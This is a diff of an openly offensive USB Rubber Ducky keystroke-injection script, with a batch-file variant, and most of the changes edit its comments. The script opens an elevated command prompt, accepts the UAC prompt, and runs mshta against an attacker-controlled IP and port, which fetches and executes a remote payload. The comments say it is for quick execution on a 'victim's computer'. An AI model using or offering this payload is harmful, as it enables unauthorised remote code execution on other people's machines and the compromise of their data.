@@ -1,27 +1,27 @@
 DELAY 1000
-REM GUI is the windows key in this instance and will use the short cut to open the run window
+REM GUI is the Windows key in this instance and will use the shortcut to open the run window
 GUI r
 DELAY 300
-REM This is what will be typed in the run window, first it will call powershell to run cmd prompt as an admin.
+REM Below is what will be typed in the run window, first, it will call PowerShell to run cmd prompt as an admin.
 STRING powershell Start-Process cmd -Verb runAs
 DELAY 400
 REM This is the shortcut where it will run the 'run window' as an admin
-CTRL-SHIFT ENTER
+CTRL-SHIFT ENTER 
 DELAY 3000
 REM This will permit the window to run as an admin
 ALT y
-REM The double enter below I find reduces the time for the powershell to run cmd prompt. 
+REM The double enter below I find reduces the time for the PowerShell to run cmd prompt. 
 ENTER 
 ENTER
 DELAY 3000
-REM Change the things in the brackets such as your IP address and the port it will communicate through. The subdomain is able to make it unique to only your server (Note that this command will be ran in cmd prompt)
+REM Change the integers in the brackets such as your IP address and the port it will communicate through. The subdomain is able to make it unique to only your server (Note that this command will be run in cmd prompt)
 STRING mshta http://[0.0.0.0]:[PORT]/[string]
 ENTER
 STRING exit
 ENTER
 
-
-REM If you wish to save the script then copy and paste this into notebook and save as a .bat file for quick execution on victim's computer
- @echo off
+REM If you wish to save the script then copy and paste this into notebook and save as a .bat file for quick execution on the victim's computer
+ 
+@echo off
   powershell -Command "Start-Process cmd.exe -ArgumentList '/k', 'mshta http://[0.0.0.0]:[PORT]/[string]', '-noexit' -Verb RunAs"
 exit
